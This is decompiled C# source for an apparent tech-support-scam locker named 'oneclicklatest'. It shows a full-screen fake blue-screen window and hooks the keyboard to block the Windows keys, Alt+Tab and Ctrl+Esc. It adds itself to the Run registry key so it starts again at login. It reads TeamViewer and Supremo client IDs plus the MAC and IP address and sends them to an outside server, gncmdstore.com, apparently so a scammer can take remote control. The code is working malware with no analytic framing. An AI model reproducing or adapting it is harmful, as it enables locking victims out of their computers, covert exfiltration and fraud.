using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using oneclicklatest.Properties;

namespace oneclicklatest;

public class Form1 : Form
{
	private struct KBDLLHOOKSTRUCT
	{
		public Keys key;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr extra;

		public int vkCode;

		public int dwExtraInfo;
	}

	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private string sMacAddress = string.Empty;

	private string country = "jp";

	private string Teamviewerstring = string.Empty;

	private IntPtr ptrHook;

	private LowLevelKeyboardProc objKeyboardProcess;

	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	internal static extern int GetTickCount();

	public Form1()
	{
		InitializeComponent();
		((Control)this).set_Bounds(Screen.get_PrimaryScreen().get_Bounds());
		supremon();
		supremo();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (sMacAddress == string.Empty)
			{
				networkInterface.GetIPProperties();
				sMacAddress = networkInterface.GetPhysicalAddress().ToString();
			}
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		objKeyboardProcess = captureKey;
		ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(mainModule.ModuleName), 0u);
	}

	private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Invalid comparison between Unknown and I4
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Invalid comparison between Unknown and I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Invalid comparison between Unknown and I4
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || (int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)1;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private IntPtr workingkey(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Invalid comparison between Unknown and I4
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Invalid comparison between Unknown and I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Invalid comparison between Unknown and I4
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || (int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)0;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private bool HasAltModifier(int flags)
	{
		return (flags & 0x20) == 32;
	}

	private long TId()
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string name = (Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (registryKey == null)
			{
				return 0L;
			}
			object value = registryKey.GetValue("ClientID");
			Teamviewerstring = value.ToString();
			if (value != null)
			{
				return Convert.ToInt64(value);
			}
			foreach (string item in registryKey.GetSubKeyNames().Reverse())
			{
				value = registryKey.OpenSubKey(item)!.GetValue("ClientID");
				MessageBox.Show(value.ToString());
				if (value != null)
				{
					return Convert.ToInt64(value);
				}
			}
			return 0L;
		}
		catch (Exception)
		{
			return 0L;
		}
	}

	private long supremon()
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string name = (Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\Supremo" : "SOFTWARE\\Supremo");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (registryKey == null)
			{
				return 0L;
			}
			object value = registryKey.GetValue("ClientID");
			Teamviewerstring = value.ToString();
			if (value != null)
			{
				return Convert.ToInt64(value);
			}
			foreach (string item in registryKey.GetSubKeyNames().Reverse())
			{
				value = registryKey.OpenSubKey(item)!.GetValue("ClientID");
				MessageBox.Show(value.ToString());
				if (value != null)
				{
					return Convert.ToInt64(value);
				}
			}
			return 0L;
		}
		catch (Exception)
		{
			return 0L;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Expected O, but got Unknown
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("SingleClick", Application.get_ExecutablePath().ToString());
		((Control)label1).set_Text(Teamviewerstring.Substring(Teamviewerstring.Length - 5));
		((Control)label3).set_Text(sMacAddress.Substring(sMacAddress.Length - 10));
		string empty = string.Empty;
		IPHostEntry hostEntry = Dns.GetHostEntry(empty);
		IPAddress[] addressList = hostEntry.AddressList;
		string text = string.Empty;
		for (int i = 0; i < addressList.Length; i++)
		{
			text = addressList[i].ToString();
		}
		WebBrowser val = new WebBrowser();
		string currentDirectory = Directory.GetCurrentDirectory();
		val.set_Url(new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + sMacAddress + "& ip=" + text + "& TeamViewer_id=" + Teamviewerstring + "& country=" + country, currentDirectory)));
		val.set_ScriptErrorsSuppressed(true);
	}

	public static string supremo()
	{
		List<string> list = new string[7] { "4", "5", "5.1", "6", "7", "8", "14" }.Reverse().ToList();
		string[] array = new string[2] { "SOFTWARE\\Supremo", "SOFTWARE\\Wow6432Node\\Supremo" };
		foreach (string text in array)
		{
			if (Registry.LocalMachine.OpenSubKey(text) == null)
			{
				continue;
			}
			foreach (string item in list)
			{
				string name = $"{text}\\Version{item}";
				if (Registry.LocalMachine.OpenSubKey(name) != null)
				{
					object value = Registry.LocalMachine.OpenSubKey(name)!.GetValue("ClientID");
					if (value != null)
					{
						return Convert.ToInt32(value).ToString();
					}
				}
			}
		}
		return string.Empty;
	}

	protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		if ((int)keyData == 262259)
		{
			return true;
		}
		if ((int)keyData == 393285)
		{
			((Form)this).Close();
			return false;
		}
		return ((Form)this).ProcessCmdKey(ref msg, keyData);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label1).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label1).set_Location(new Point(406, 41));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(35, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("label1");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label2).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label2).set_Location(new Point(463, 41));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(30, 13));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("MAC");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label3).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label3).set_Location(new Point(504, 41));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(35, 13));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("label3");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label4).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label4).set_Location(new Point(365, 41));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(25, 13));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("TID");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.bsod_errornew);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
